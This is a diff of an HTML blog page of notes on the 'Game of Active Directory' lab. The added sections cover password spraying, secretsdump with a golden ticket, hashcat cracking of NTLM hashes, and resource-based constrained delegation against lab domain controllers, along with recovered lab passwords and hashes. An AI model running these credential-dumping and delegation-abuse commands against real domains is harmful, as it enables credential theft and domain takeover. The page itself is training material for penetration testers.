@@ -59,13 +59,13 @@
  
 
 <meta name="author" content="Jack69" />
-<meta name="description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svc YouWillNotKerboroast1ngMeeeeee TODO …" />
+<meta name="description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svc YouWillNotKerboroast1ngMeeeeee SEVENKINGDOMS …" />
 <meta name="keywords" content="">
 
 
   <meta property="og:site_name" content="Jack's Corner"/>
   <meta property="og:title" content="Game of Active Directory Notes"/>
-  <meta property="og:description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svc YouWillNotKerboroast1ngMeeeeee TODO …"/>
+  <meta property="og:description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svc YouWillNotKerboroast1ngMeeeeee SEVENKINGDOMS …"/>
   <meta property="og:locale" content="en_US"/>
   <meta property="og:url" content="https://ojack69.github.io/jacks-corner/ad/goad.html"/>
   <meta property="og:type" content="article"/>
@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a><ul><li><a class="toc-href" href="#alternative-1" title="Alternative 1">Alternative 1</a></li><li><a class="toc-href" href="#alternative-2" title="Alternative 2">Alternative 2</a></li></ul></li><li><a class="toc-href" href="#golden-ticket_1" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#silver-ticket_1" title="Silver Ticket">Silver Ticket</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a><ul><li><a class="toc-href" href="#winterfell" title="WINTERFELL">WINTERFELL</a></li><li><a class="toc-href" href="#kingslanding" title="KINGSLANDING">KINGSLANDING</a></li></ul></li><li><a class="toc-href" href="#credentials-dumping_1" title="Credentials Dumping">Credentials Dumping</a><ul><li><a class="toc-href" href="#north" title="NORTH">NORTH</a><ul><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li></ul></li><li><a class="toc-href" href="#kingslanding_2" title="KINGSLANDING">KINGSLANDING</a></li></ul></li><li><a class="toc-href" href="#gpo-abuse_1" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a><ul><li><a class="toc-href" href="#alternative-1" title="Alternative 1">Alternative 1</a></li><li><a class="toc-href" href="#alternative-2" title="Alternative 2">Alternative 2</a></li></ul></li><li><a class="toc-href" href="#resource-based-constrained-delegation_1" title="Resource-based constrained delegation">Resource-based constrained delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#silver-ticket_1" title="Silver Ticket">Silver Ticket</a></li></ul></div>
         </div>
     <h2 id="status">Status</h2>
 <p>Recovered Passwords:</p>
@@ -199,6 +199,26 @@
 <tr>
 <td>NORTH\sql_svc</td>
 <td>YouWillNotKerboroast1ngMeeeeee</td>
+</tr>
+<tr>
+<td>SEVENKINGDOMS\cersei.lannister</td>
+<td>il0vejaime</td>
+</tr>
+<tr>
+<td>SEVENKINGDOMS\robert.baratheon</td>
+<td>iamthekingoftheworld</td>
+</tr>
+<tr>
+<td>SEVENKINGDOMS\petyer.baelish</td>
+<td>@littlefinger@</td>
+</tr>
+<tr>
+<td>SEVENKINGDOMS\joffrey.baratheon</td>
+<td>1killerlion</td>
+</tr>
+<tr>
+<td>SEVENKINGDOMS\tywin.lannister</td>
+<td>powerkingftw135</td>
 </tr>
 </tbody>
 </table>
@@ -609,12 +629,19 @@
 <p>After enumerating users with <code>robb.stark</code>, a cleartext password for user <code>samwell.tarly</code> is found in the description property:</p>
 <p><img alt="north-users-enumetation.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-users-enumetation.png"/></p>
 <h2 id="password-spraying">Password Spraying</h2>
+<h3 id="winterfell">WINTERFELL</h3>
 <p>Using this <a href="https://github.com/ojack69/jacks-corner/blob/main/scripts/PowerShell/PasswordSprayer.ps1">script</a>, perform password spraying using the username as password:</p>
 <div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">PasswordSprayer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-UsernameAsPassword</span>
 </code></pre></div>
 <p><img alt="north-password-spraying.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-password-spraying.png"/></p>
-<h2 id="credentials-dumping">Credentials Dumping</h2>
-<h2 id="donpapi">DonPAPI</h2>
+<h3 id="kingslanding">KINGSLANDING</h3>
+<p>Using this <a href="https://github.com/ojack69/jacks-corner/blob/main/scripts/PowerShell/PasswordSprayer.ps1">script</a>, perform password spraying using the secret decrypted in <a href="https://ojack69.github.io/jacks-corner/ad/goad.html#shares-enumeration">Shares Enumeration</a>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">PasswordSprayer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Password</span> <span class="n">powerkingftw135</span>
+</code></pre></div>
+<p><img alt="sevenkingdoms-password-spraying.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-password-spraying.png"/></p>
+<h2 id="credentials-dumping_1">Credentials Dumping</h2>
+<h3 id="north">NORTH</h3>
+<h4 id="donpapi">DonPAPI</h4>
 <div class="highlight"><pre><span></span><code>donpapi<span class="w"> </span>collect<span class="w"> </span>-u<span class="w"> </span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>-d<span class="w"> </span>NORTH.local<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.1.0.11
 </code></pre></div>
 <p><img alt="north-dumping-credentials-donPAPI.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-dumping-credentials-donPAPI.png"/></p>
@@ -623,14 +650,30 @@
 </code></pre></div>
 <p><img alt="north-smb-relay-credential-dumping.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-smb-relay-credential-dumping.png"/></p>
 <p>By performing password spraying, the password <code>YouWillNotKerboroast1ngMeeeeee</code> belongs to <code>sql_svc</code></p>
-<h2 id="mimikatz">Mimikatz</h2>
+<h4 id="mimikatz">Mimikatz</h4>
 <p>With <code>eddard.stark</code> (domain admin):</p>
 <div class="highlight"><pre><span></span><code>privilege::debug
 lsadump::dcsync /user:arya.stark
 </code></pre></div>
 <p>Dumping NTLM hash: <code>4f622f4cd4284a887228940e2ff4e709</code></p>
 <p><img alt="north-dumping-credentials-mimikatz-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-dumping-credentials-mimikatz-cracking.png"/></p>
-<h2 id="gpo-abuse">GPO Abuse</h2>
+<h3 id="kingslanding_2">KINGSLANDING</h3>
+<p>Dump all secrets using golden ticket from <a href="https://ojack69.github.io/jacks-corner/ad/goad.html#child-domain-to-parent">Golden Ticket - Child domain to parent</a>:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
+</code></pre></div>
+<p><img alt="sevenkingdoms-secretdumps-with-golden-ticket.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-secretdumps-with-golden-ticket.png"/></p>
+<p>Crack dumped NTLM hashes with hashcat:</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>sam_kingslanding.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<p><img alt="sevenkingdoms-sam-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-sam-cracking.png"/></p>
+<p>Cracked the following hashes:</p>
+<div class="highlight"><pre><span></span><code><span class="n">cersei</span><span class="p">.</span><span class="nl">lannister</span><span class="p">:</span><span class="nl">c247f62516b53893c7addcf8c349954b</span><span class="p">:</span><span class="n">il0vejaime</span>
+<span class="n">robert</span><span class="p">.</span><span class="nl">baratheon</span><span class="p">:</span><span class="mi">9029</span><span class="nl">cf007326107eb1c519c84ea60dbe</span><span class="p">:</span><span class="n">iamthekingoftheworld</span>
+<span class="n">petyer</span><span class="p">.</span><span class="nl">baelish</span><span class="p">:</span><span class="mi">6</span><span class="nl">c439acfa121a821552568b086c8d210</span><span class="p">:</span><span class="nv">@littlefinger</span><span class="err">@</span>
+<span class="n">joffrey</span><span class="p">.</span><span class="nl">baratheon</span><span class="p">:</span><span class="mi">3</span><span class="nl">b60abbc25770511334b3829866b08f1</span><span class="p">:</span><span class="mi">1</span><span class="n">killerlion</span>
+</code></pre></div>
+<h2 id="gpo-abuse_1">GPO Abuse</h2>
 <div class="highlight"><pre><span></span><code>Get-GPO -All
 </code></pre></div>
 <p><img alt="north-gpo-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-gpo-enumeration.png"/></p>
@@ -797,7 +840,26 @@ impacket-psexec<span class="w"> </span>-no-pass<span class="w"> </span>-k<span c
 impacket-psexec<span class="w"> </span>-no-pass<span class="w"> </span>-k<span class="w"> </span>winterfell.north.sevenkingdoms.local
 </code></pre></div>
 <p><img alt="north-constrained-delegation-ptt-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-ptt-alt1.png"/></p>
-<h2 id="golden-ticket_1">Golden Ticket</h2>
+<h2 id="resource-based-constrained-delegation_1">Resource-based constrained delegation</h2>
+<p>Enumerate machine quota on KINGSLANDING.SEVENKINGDOMS.local:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>kingslanding.sevenkingdoms.local<span class="w"> </span>-d<span class="w"> </span>SEVENKINGDOMS.local<span class="w"> </span>-u<span class="w"> </span>cersei.lannister<span class="w"> </span>-p<span class="w"> </span>il0vejaime<span class="w"> </span>-M<span class="w"> </span>maq
+</code></pre></div>
+<p><img alt="sevenkingdoms-rbcd-quota-enum.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-rbcd-quota-enum.png"/></p>
+<p>Create new computer object and it to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> of <code>KINGSLANDING$</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-rbcd<span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'KINGSLANDING$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>-action<span class="w"> </span><span class="s1">'read'</span><span class="w"> </span>SEVENKINGDOMS/cersei.lannister:il0vejaime@kingslanding.sevenkingdoms.local
+
+impacket-addcomputer<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">'rbcdcomputer$'</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">'password'</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>SEVENKINGDOMS/cersei.lannister:il0vejaime
+
+impacket-rbcd<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s1">'rbcdcomputer$'</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'KINGSLANDING$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> &nbsp;</span>SEVENKINGDOMS/cersei.lannister:il0vejaime
+
+impacket-rbcd<span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'KINGSLANDING$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>-action<span class="w"> </span><span class="s1">'read'</span><span class="w"> </span>SEVENKINGDOMS/cersei.lannister:il0vejaime
+</code></pre></div>
+<p><img alt="sevenkingdoms-rbcd-add-computer.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-rbcd-add-computer.png"/></p>
+<p>Request a  <code>cifs/kingslanding.sevenkingdoms.local</code> TGS on behalf of Administrator to <code>rbcdcomputer$</code> that will perform <code>S4U</code>:</p>
+<p><img alt="sevenkingdoms-rbcd-request-tgs.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-rbcd-request-tgs.png"/></p>
+<p>Use the TGS to authenticate as Administrator on <code>KINGSLANDING</code>:</p>
+<p><img alt="sevenkingdoms-rbcd-ptt.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-rbcd-ptt.png"/></p>
+<h2 id="golden-ticket">Golden Ticket</h2>
 <h3 id="child-domain-to-parent">Child domain to parent</h3>
 <p>Dump NTLM hashes and Kerberos keys:</p>
 <div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>robb.stark:sexywolfy@winterfell.north.sevenkingdoms.local
